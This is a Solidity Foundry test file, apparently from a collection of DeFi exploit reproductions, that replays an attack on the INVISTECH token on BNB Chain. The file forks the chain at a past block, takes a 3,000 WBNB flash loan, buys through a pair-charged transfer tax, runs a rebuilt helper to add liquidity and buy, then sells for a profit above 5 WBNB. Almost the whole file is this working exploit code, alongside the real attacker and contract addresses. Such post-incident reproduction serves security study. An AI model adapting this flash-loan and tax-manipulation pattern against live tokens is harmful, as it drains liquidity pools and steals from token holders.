// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 5.14 BNB
// Attacker : 0x52e38d496f8d712394d5ed55e4d4cdd21f1957de
// Attack Contract : 0x3f364b486b99dd1433287d3b1aa49addfe94f790
// Vulnerable Contract : 0xAa217F7BaB90100419B99c027AdCf5f0a005C192
// Attack Tx : {link: https://bscscan.com/tx/0x92126f0bde98d360b37b7074fea6f41fd47fd19d1cced134681ff64b1aef56b8}
//
// @Info
// Vulnerable Contract Code : {https://bscscan.com/address/0xaa217f7bab90100419b99c027adcf5f0a005c192#code}
//
// @Analysis
// Twitter Guy : {https://t.me/defimon_alerts/515}
//
// INVISTECH taxes transfers when either side is a configured pair. On buys from
// the INVISTECH/WBNB pair, the tax is charged from the pair itself, removing
// extra INVISTECH from pair balance and making the pool price manipulable. The
// attacker used a WBNB flash loan plus a helper with pre-positioned balances to
// add/buy liquidity, then sold the flash-bought INVISTECH back for WBNB profit.

address constant ATTACKER = 0x52e38D496F8D712394D5ED55E4d4Cdd21f1957De;
address constant ATTACK_CONTRACT = 0x3F364b486B99dd1433287d3b1aA49Addfe94F790;
address constant HISTORICAL_HELPER = 0x2945b340d851649871a4195Ad68fE0Ac53885591;
address constant LP_RECEIVER = 0x9617A91DaffE6C79a2a702fA48BB62ae856F1a44;
address constant INVISTECH_TOKEN = 0xAA217F7BAb90100419b99c027adCf5F0A005C192;
address constant WBNB_TOKEN = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
address constant USDT_TOKEN = 0x55d398326f99059fF775485246999027B3197955;
address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
address constant PANCAKE_V3_POOL = 0x172fcD41E0913e95784454622d1c3724f546f849;

interface IRebuiltHelper {
    function run() external;
}

contract RebuiltInvistechHelper {
    IPancakeRouter private constant router = IPancakeRouter(payable(PANCAKE_ROUTER));
    IERC20 private constant invistech = IERC20(INVISTECH_TOKEN);
    IERC20 private constant wbnb = IERC20(WBNB_TOKEN);
    IERC20 private constant usdt = IERC20(USDT_TOKEN);

    function run() external {
        address[] memory usdtToWbnb = new address[](2);
        usdtToWbnb[0] = USDT_TOKEN;
        usdtToWbnb[1] = WBNB_TOKEN;

        uint256 usdtAmount = usdt.balanceOf(address(this));
        usdt.approve(PANCAKE_ROUTER, usdtAmount);
        router.swapExactTokensForTokens(usdtAmount, 0, usdtToWbnb, address(this), block.timestamp);

        address[] memory wbnbToInvistech = new address[](2);
        wbnbToInvistech[0] = WBNB_TOKEN;
        wbnbToInvistech[1] = INVISTECH_TOKEN;

        uint256 wbnbHalf = wbnb.balanceOf(address(this)) / 2;
        uint256 invistechQuote = router.getAmountsOut(wbnbHalf, wbnbToInvistech)[1];

        wbnb.approve(PANCAKE_ROUTER, wbnbHalf);
        invistech.approve(PANCAKE_ROUTER, invistechQuote);
        router.addLiquidity(
            INVISTECH_TOKEN,
            WBNB_TOKEN,
            invistechQuote,
            wbnbHalf,
            (invistechQuote * 80) / 100,
            (wbnbHalf * 80) / 100,
            LP_RECEIVER,
            block.timestamp
        );

        wbnb.approve(PANCAKE_ROUTER, wbnbHalf);
        router.swapExactTokensForTokens(wbnbHalf, 0, wbnbToInvistech, address(this), block.timestamp);
    }
}

contract ContractTest is BaseTestWithBalanceLog {
    IPancakeV3Pool private constant flashPool = IPancakeV3Pool(PANCAKE_V3_POOL);
    IPancakeRouter private constant router = IPancakeRouter(payable(PANCAKE_ROUTER));
    IERC20 private constant invistech = IERC20(INVISTECH_TOKEN);
    IWBNB private constant wbnb = IWBNB(payable(WBNB_TOKEN));

    uint256 private constant FLASH_AMOUNT = 3_000 ether;

    function setUp() public {
        uint256 forkBlock = 46_946_670;
        vm.createSelectFork("bsc", forkBlock);

        fundingToken = WBNB_TOKEN;
        vm.label(ATTACKER, "Attacker");
        vm.label(ATTACK_CONTRACT, "Historical attack contract");
        vm.label(HISTORICAL_HELPER, "Historical helper");
        vm.label(INVISTECH_TOKEN, "INVISTECH");
        vm.label(WBNB_TOKEN, "WBNB");
        vm.label(USDT_TOKEN, "USDT");
        vm.label(PANCAKE_ROUTER, "Pancake Router");
        vm.label(PANCAKE_V3_POOL, "Pancake V3 USDT/WBNB Pool");

        RebuiltInvistechHelper helper = new RebuiltInvistechHelper();
        vm.etch(HISTORICAL_HELPER, address(helper).code);
    }

    function testExploit() public balanceLog {
        uint256 balanceBefore = wbnb.balanceOf(address(this));
        flashPool.flash(address(this), 0, FLASH_AMOUNT, "");
        assertGt(wbnb.balanceOf(address(this)) - balanceBefore, 5 ether);
    }

    function pancakeV3FlashCallback(uint256, uint256 fee1, bytes calldata) external {
        require(msg.sender == PANCAKE_V3_POOL, "pool only");

        address[] memory buyPath = new address[](2);
        buyPath[0] = WBNB_TOKEN;
        buyPath[1] = INVISTECH_TOKEN;

        wbnb.approve(PANCAKE_ROUTER, type(uint256).max);
        invistech.approve(PANCAKE_ROUTER, type(uint256).max);

        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            FLASH_AMOUNT, 0, buyPath, address(this), block.timestamp
        );

        IRebuiltHelper(HISTORICAL_HELPER).run();

        address[] memory sellPath = new address[](2);
        sellPath[0] = INVISTECH_TOKEN;
        sellPath[1] = WBNB_TOKEN;
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            invistech.balanceOf(address(this)), 0, sellPath, address(this), block.timestamp
        );

        wbnb.transfer(PANCAKE_V3_POOL, FLASH_AMOUNT + fee1);
    }
}
